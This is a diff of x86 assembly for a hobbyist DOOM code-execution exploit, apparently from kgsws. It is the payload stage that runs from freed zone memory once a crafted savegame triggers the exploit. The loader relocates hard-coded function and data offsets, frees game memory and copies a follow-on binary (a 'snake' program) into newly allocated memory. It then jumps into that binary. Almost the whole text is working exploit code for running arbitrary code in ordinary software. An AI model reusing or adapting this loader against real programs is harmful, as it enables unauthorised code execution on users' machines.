@@ -1,79 +1,156 @@
 // kgsws' DOOM code execution
-// - this code is executed after triggering the exploit
-// - this code is executed as a PSPR action code pointer
 // - this code is running from memory block allocated but already freed by ZONE
 // - this source only contains payload, you still need exploited savegame file
 //
 // %eax - pointer to players[] structure array
 // %edx - pointer to pspdef_t in player structure
 
+#define TEXT_START	0x1000
+
 .section .text
 .globl _start
 
+// Loaders purpose is
+// - free everything it can
+// - allocate memory for the code and copy it
+// - allocate memory for .bss and clear it
+// - run the code
+
 _start:
-	// get CODE base
-	mov	(%esp),%edx
-	sub	$0x2D1D5,%edx
+	// backup everything needed
+	push	%ebx
+	push	%ecx
+	push	%edx
+	push	%esi
+	push	%edi
+	push	%ebp
+
+	// get _start base
+	mov	12(%ecx),%esi
+	add	$(8922-TEXT_START),%esi	// ESI will always point to local base
 	// get DATA base
 	sub	$0x2B24C,%eax
-	// backup stack
-	pusha
+	push	%eax
+	// get CODE base
+	mov	28(%esp),%eax
+	sub	$0x2D1D5,%eax
 
-	//
-	// NOTE
-	// everything here is just a quick example
+	// relocate CODE references
+	mov	$reloc_code_start,%ebx
+	mov	$((reloc_code_end-reloc_code_start)/4),%edx
+	call	do_reloc
 
-	// set gamestate to GS_DEMOSCREEN
-	mov	$3,%ebx
-	mov	%ebx,0x2B7C8(%eax)
-	// delay demosequence
-	xor	%ebx,%ebx
-	mov	%ebx,0x2A760(%eax)
-	mov	$350,%ebx
-	mov	%ebx,0x2A754(%eax)
+	// relocate DATA references
+	pop	%eax
+	mov	$reloc_data_start,%ebx
+	mov	$((reloc_data_end-reloc_data_start)/4),%edx
+	call	do_reloc
 
-	// change TITLEPIC
-	mov	$0x21618,%ebx
+	// force title screen
+	mov	gamestate(%esi),%eax
+	movw	$3,(%eax)
+	mov	wipegamestate(%esi),%eax
+	movw	$-1,(%eax)
+	call	*D_StartTitle(%esi)
+
+	// stop music (to free the data)
+	call	*S_StopMusic(%esi)
+
+	// free everything not needed
+	mov	$50,%eax	// from PU_LEVEL
+	mov	$9999,%edx	// and everything else
+	call	*Z_FreeTags(%esi)
+
+	// allocate memory for payload and its .bss
+	mov	payload_is_here(%esi),%eax
+	add	-(8946-TEXT_START)(%esi),%eax // almost savegame size (this won't be used anyway)
+	mov	$1,%edx	// PU_STATIC
+	xor	%ebx,%ebx // NULL
+	call	*Z_Malloc(%esi)
+
+	// copy the payload
+	push	%eax
+	lea	payload_is_here(%esi),%ecx
+	mov	-(8946-TEXT_START)(%esi),%ebx
 	add	%eax,%ebx
-	mov	%ebx,0x1d730(%edx)	// pagename =
-	mov	%ebx,0x1d7cd(%edx)	// pagename =
-	mov	%ebx,0x2a75c(%eax)	// *pagename
-
-	// change menu 'skull' selector
-	// (in a very inefficient way, i know)
-	mov	$0x4f465453,%ebx
-	mov	%ebx,0x12226(%eax)
-	mov	$0x30484355,%ebx
-	mov	%ebx,0x1222a(%eax)
-	mov	$0x45465453,%ebx
-	mov	%ebx,0x1222e(%eax)
-	mov	$0x00304c56,%ebx
-	mov	%ebx,0x12232(%eax)
-
-	// reverse 'run key' logic (auto run)
-	mov	$0x01,%bl
-	mov	%bl,0x1fbe5(%edx)
-
-	// enable menu
-	push	%eax
-	push	%edx
-	mov	$0x23D10,%ebx
-	add	%edx,%ebx
-	call	*%ebx
-	pop	%edx
+copy_loop:
+	mov	(%ecx),%edx
+	mov	%edx,(%eax)
+	add	$4,%ecx
+	add	$4,%eax
+	cmp	%ebx,%eax
+	jl	copy_loop
 	pop	%eax
 
-	// start sound
-	push	%eax
-	push	%edx
-	mov	$0x3f560,%ecx
-	add	%edx,%ecx
-	xor	%ebx,%ebx
-	mov	$58,%edx
-	call	*%ecx
-	pop	%edx
-	pop	%eax
+	// pass relocation info
+	mov	_code_base(%esi),%ebx
+	mov	_data_base(%esi),%ecx
 
-	// continue the game
-	popa
+	// run the code
+	add	$4,%eax
+	jmp	*%eax
+
+// relocate the section
+// %eax - section base
+// %ebx - reloc start
+// %edx - reloc count
+do_reloc: // TODO: rework; there is always one element
+	add	%esi,%ebx
+do_reloc_loop:
+	test	%edx,%edx
+	jz	do_reloc_end
+	dec	%edx
+	add	%eax,(%ebx)
+	add	$4,%ebx
+	jmp	do_reloc_loop
+do_reloc_end:
 	ret
+
+//
+// tables
+
+// pointers to the CODE section
+// everything here has to be called indirectly
+reloc_code_start:
+//
+_code_base:
+	.4byte	0
+S_StopMusic:
+	.4byte	0x0003EE30
+D_StartTitle:
+	.4byte	0x0001D830
+Z_Malloc:
+	.4byte	0x000397D0
+Z_FreeTags:
+	.4byte	0x000398C0
+//
+reloc_code_end:
+
+// pointers to the DATA section
+// everything here has to be addressed indirectly
+reloc_data_start:
+//
+_data_base:
+	.4byte	0
+gamestate:
+	.4byte	0x0002B7C8
+wipegamestate:
+	.4byte	0x00011B44
+//
+reloc_data_end:
+
+payload_is_here:
+// present at the end of loader
+// this part is in compiled 'snake' binary
+/*
+	// .bss size
+	.4byte	8
+	// continue
+	pop	%ebp
+	pop	%edi
+	pop	%esi
+	pop	%edx
+	pop	%ecx
+	pop	%ebx
+	ret
+*/
